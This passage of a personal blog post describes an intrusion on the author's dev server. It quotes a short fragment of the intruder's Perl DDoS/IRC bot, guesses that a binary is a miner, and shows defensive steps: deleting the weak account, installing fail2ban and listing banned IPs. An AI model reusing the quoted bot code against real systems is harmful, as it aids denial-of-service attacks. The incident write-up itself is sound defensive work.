+</span></span><span class=line><span class=cl>  <span class=k>my</span> <span class=nv>$msg</span> <span class=o>=</span> <span class=s>&#39;B&#39;</span> <span class=n>x</span> <span class=nv>$_</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=k>my</span> <span class=nv>$ftime</span> <span class=o>=</span> <span class=nv>$_</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  <span class=k>my</span> <span class=nv>$cp</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>my</span> <span class=p>(</span><span class=nv>%pacotes</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nv>$pacotes</span><span class=p>{</span><span class=n>icmp</span><span class=p>}</span> <span class=o>=</span> <span class=nv>$pacotes</span><span class=p>{</span><span class=n>igmp</span><span class=p>}</span> <span class=o>=</span> <span class=nv>$pacotes</span><span class=p>{</span><span class=n>udp</span><span class=p>}</span> <span class=o>=</span> <span class=nv>$pacotes</span><span class=p>{</span><span class=n>o</span><span class=p>}</span> <span class=o>=</span> <span class=nv>$pacotes</span><span class=p>{</span><span class=n>tcp</span><span class=p>}</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span></code></pre></div><p>Yep, it&rsquo;s a DDOS bot, with arbitrary command execution for fun. And that&rsquo;s it,
+other than loads and loads of code to manage IRC channels, kicking and finding
+users etc. If I had to guess, someone took a portugese IRC bot written in perl
+(for some unknown reason) and modified it crudely to be an attack payload. But
+who knows, maybe they also use your computer to manage IRC channels?</p><h3 id=the-binary>The binary</h3><p>I have yet to dissassemble the binary. As a guess I reckon it&rsquo;s a bitcoin
+miner: it used a <em>lot</em> of cpu, but nothing so far really fits an attempted
+ransomware attack, and linux is a poor platform for such attacks: permissions
+mean you can basically only encrypt your own home directory. Of course there
+are elevation exploits, but there&rsquo;s no indication they tried any here. Likewise
+exfiltration is possible, although there&rsquo;s nothing they could read I really care
+about, but again there&rsquo;s no evidence it happened.</p><p>If/when I get round to reverse engineering the binary, I&rsquo;ll update here.</p><h2 id=prognosis>Prognosis</h2><p>The system is safe. <code>test</code> was a stupid user account, let&rsquo;s get rid of it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo userdel <span class=nb>test</span>
+</span></span></code></pre></div><p>No more exploit. They <em>could</em> have done something worse, and I should probably
+nuke from orbit. But I found the usual password-spraying attacks. In the long
+run I should go back to disabling password auth entirely, but in the short-term
+installing <code>fail2ban</code> provides agreeable catharsis:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo fail2ban-client banned
+</span></span><span class=line><span class=cl><span class=o>[{</span><span class=s1>&#39;sshd&#39;</span>: <span class=o>[</span><span class=s1>&#39;178.128.184.213&#39;</span>, <span class=s1>&#39;45.154.12.139&#39;</span>, <span class=s1>&#39;115.254.63.50&#39;</span>, <span class=s1>&#39;113.21.232.39&#39;</span>, <span class=s1>&#39;23.95.215.44&#39;</span>, <span class=s1>&#39;43.154.26.210&#39;</span>, <span class=s1>&#39;49.0.129.3&#39;</span>, <span class=s1>&#39;45.64.112.96&#39;</span>, <span class=s1>&#39;152.32.150.45&#39;</span>, <span class=s1>&#39;210.195.100.138&#39;</span>, <span class=s1>&#39;183.94.133.168&#39;</span>, <span class=s1>&#39;157.230.218.88&#39;</span>, <span class=s1>&#39;175.139.245.205&#39;</span><span class=o>]}]</span>
+</span></span></code></pre></div><p>I was lucky; this was a low-intensity attack; there&rsquo;s nothing else odd in the
+logs.</p><h2 id=takeaways>Takeaways</h2><p>Dev machines are going to have silly things like <code>adduser test</code> run on them.
+Don&rsquo;t combine dev machines with public gateway servers. Protect them with ssh
+keys and default-deny security.</p><p>Oh, and do use permissions, and encrypt stuff which actually matters, and have
+proper backups&mdash;ideally initiated from the backup server, not the device, which
+shouldn&rsquo;t have write access to the server.</p><p>And watch out for portugese IRC bots. You don&rsquo;t know where they&rsquo;ve been.</p></article><ul class="pager blog-pager"><li class=previous><a href=https://2e0byo.github.io/post/repairs/abs-sensor/ data-toggle=tooltip data-placement=top title="Tracking down a faulty ABS sensor">&larr; Previous Post</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=mailto:2e0byo@gmail.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/2e0byo title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://gitlab.com/2e0byo title=GitLab><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fab fa-gitlab fa-stack-1x fa-inverse"></i></span></a></li><li><a href title=RSS><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
+<i class="fas fa-rss fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted">John Morris
+&nbsp;&bull;&nbsp;&copy;
+2022
+&nbsp;&bull;&nbsp;
+<a href=https://2e0byo.github.io/>Jack of All Trades</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.105.0</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a>
+&nbsp;&bull;&nbsp;[<a href=https://github.com/2e0byo/blog/commit/9e91670ffa263c507768a98461e9e99fd1f693d5>9e91670f</a>]</p></div></div></div></footer><script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe crossorigin=anonymous></script>
+<script src=https://code.jquery.com/jquery-1.12.4.min.js integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin=anonymous></script>
+<script src=https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js integrity=sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa crossorigin=anonymous></script>
+<script src=https://2e0byo.github.io/js/main.js></script><script>renderMathInElement(document.body)</script><script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js integrity=sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy crossorigin=anonymous></script>
+<script src=https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js integrity=sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q crossorigin=anonymous></script><script src=https://2e0byo.github.io/js/load-photoswipe.js></script></body></html>
